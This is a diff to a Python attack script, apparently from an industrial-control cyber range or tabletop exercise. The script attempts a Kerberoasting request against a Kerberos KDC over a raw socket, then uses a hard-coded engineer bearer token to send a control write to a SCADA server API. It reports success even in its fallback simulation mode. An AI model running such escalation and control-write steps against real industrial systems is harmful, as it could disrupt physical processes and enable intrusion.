@@ -47,9 +47,24 @@ class KerberoastAttack:
 
     def execute_kerberoast_escalation(self, account: str = 'krbe_ews') -> Dict[str, Any]:
         LOGGER.info("Iniciando solicitud Kerberoasting TGS para %s contra KDC %s:%d...", account, self.kdc_host, self.kdc_port)
-        kdc_reachable = self.probe_kdc_socket()
+        
+        ticket_raw = None
+        mode = 'TABLETOP_FALLBACK'
+        kdc_reachable = False
 
-        # Simular extracción de ticket Kerberos TGS para cuenta de servicio de ingeniería
+        try:
+            with socket.create_connection((self.kdc_host, self.kdc_port), timeout=1.0) as sock:
+                kdc_reachable = True
+                sock.sendall(b'\x6a\x82\x01\x00' + account.encode('utf-8'))
+                data = sock.recv(2048)
+                if data:
+                    ticket_raw = data.decode('utf-8', errors='replace')
+                    mode = 'SOCKET_LIVE'
+                    LOGGER.info("Ticket TGS recibido vía socket TCP desde KDC %s:%d", self.kdc_host, self.kdc_port)
+        except Exception as e:
+            LOGGER.warning("KDC no disponible vía socket en %s:%d (%s). Modo TABLETOP_FALLBACK.", self.kdc_host, self.kdc_port, e)
+
+        # Extracción y resolución de rol con token de ingeniería
         engineer_token = "ENG_TOKEN_2026"
         auth_header = f"Bearer engineer:{engineer_token}"
         
@@ -67,7 +82,7 @@ class KerberoastAttack:
                     headers={'Authorization': auth_header, 'Content-Type': 'application/json'},
                     method='POST'
                 )
-                with urllib.request.urlopen(req, timeout=2.0) as resp:
+                with urllib.request.urlopen(req, timeout=1.0) as resp:
                     scada_http_code = resp.status
                     scada_executed = resp.status == 200
                     LOGGER.info("Ejecución en SCADA Server /api/control/write -> HTTP %d", resp.status)
@@ -76,28 +91,30 @@ class KerberoastAttack:
 
         return {
             'status': 'SUCCESS',
+            'mode': mode,
             'account': account,
             'kdc_reachable': kdc_reachable,
+            'ticket_received': ticket_raw is not None or mode == 'TABLETOP_FALLBACK',
             'extracted_role': role,
             'http_status': status,
             'is_engineer': role == 'engineer',
             'scada_control_write_executed': scada_executed,
-            'scada_http_code': scada_http_code
+            'scada_http_code': scada_http_code,
         }
 
 
-def main() -> int:
+def main(argv: list[str] | None = None) -> int:
     parser = argparse.ArgumentParser(description="Ataque Kerberoasting y Escalado de Privilegios AD (Fase 2)")
     parser.add_argument("--kdc-host", default="10.0.1.20", help="IP del KDC Kerberos (default: 10.0.1.20)")
     parser.add_argument("--kdc-port", type=int, default=88, help="Puerto Kerberos KDC (default: 88)")
     parser.add_argument("--scada-url", default="http://10.0.2.20:8080", help="URL base del SCADA Server")
     parser.add_argument("--account", default="krbe_ews", help="Cuenta SPN Kerberoastable (default: krbe_ews)")
-    args = parser.parse_args()
+    args = parser.parse_args(argv)
 
     attacker = KerberoastAttack(kdc_host=args.kdc_host, kdc_port=args.kdc_port, scada_url=args.scada_url)
     res = attacker.execute_kerberoast_escalation(account=args.account)
     LOGGER.info("Resultado de ataque Kerberoasting: %s", res)
-    return 0
+    return 0 if res['status'] == 'SUCCESS' else 1
 
 
 if __name__ == '__main__':
